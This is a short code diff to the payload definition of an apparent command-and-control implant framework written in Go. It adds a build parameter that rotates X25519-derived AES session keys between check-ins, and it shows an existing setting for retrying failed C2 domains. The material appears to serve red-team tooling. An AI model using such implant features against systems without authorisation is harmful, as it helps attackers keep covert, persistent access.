@@ -343,6 +343,13 @@ var payloadDefinition = agentstructs.PayloadType{
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
 		},
 		{
+			Name:          "key_rotation_interval",
+			Description:   "Number of check-ins between ECDH key rotations for forward secrecy. Each rotation generates ephemeral X25519 keys and derives a new AES-256 session key, limiting the blast radius of key compromise. Default: 0 (disabled). Recommended: 100 for long-term implants.",
+			Required:      false,
+			DefaultValue:  "0",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
 			Name:          "recovery_interval",
 			Description:   "Seconds between recovery attempts for unhealthy C2 domains. When a domain fails repeatedly, it is marked unhealthy and skipped. After this interval, the agent retries it. Default: 600 (10 minutes). Only relevant when using multiple domains/fallback hosts.",
 			Required:      false,
